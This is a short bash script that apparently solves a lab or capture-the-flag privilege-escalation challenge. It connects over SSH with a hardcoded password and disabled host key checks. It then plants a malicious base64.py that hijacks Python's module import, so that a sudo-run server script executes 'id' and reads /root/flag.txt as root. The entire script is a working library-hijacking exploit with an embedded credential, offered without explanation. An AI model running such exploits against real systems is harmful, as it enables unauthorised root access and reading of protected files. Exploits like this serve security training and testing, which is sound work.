#!/bin/bash
export SSHPASS=qX7p-yZ0EX
SSH="sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 17161 academy@chatelaine.cylabacademy.net"
$SSH 'printf "%s\n" "import os" "os.system(\"id; cat /root/flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null\")" > /home/academy/base64.py; chmod 644 /home/academy/base64.py; ls -la /home/academy/base64.py' 2>&1 | tail -6
echo "=== execution via sudo ==="
$SSH 'cd /home/academy && echo qX7p-yZ0EX | sudo -S /usr/bin/python3 /home/academy/.server.py 2>&1' 2>&1 | tail -20
